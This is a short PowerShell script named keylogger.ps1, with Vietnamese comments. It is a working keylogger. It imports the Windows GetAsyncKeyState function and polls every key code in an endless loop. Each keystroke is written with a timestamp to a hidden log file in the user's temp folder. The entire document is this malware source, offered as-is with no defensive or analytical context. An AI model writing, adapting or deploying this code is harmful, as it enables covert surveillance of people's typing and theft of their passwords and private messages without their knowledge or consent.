# keylogger.ps1
$logFilePath = "$env:temp\keylog.txt"

# Hàm ghi log
function LogKeyStroke {
    param (
        [string]$key
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $key"
    Add-Content -Path $logFilePath -Value $logEntry
}

# Hook vào sự kiện bàn phím
$signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern int GetAsyncKeyState(int vKey);
'@
Add-Type -MemberDefinition $signature -Name Keyboard -Namespace PsKeylogger

# Vòng lặp vô hạn để ghi lại các phím được nhấn
while ($true) {
    Start-Sleep -Milliseconds 40
    for ($i = 1; $i -le 254; $i++) {
        $state = [PsKeylogger.Keyboard]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [char]$i
            LogKeyStroke $key
        }
    }
}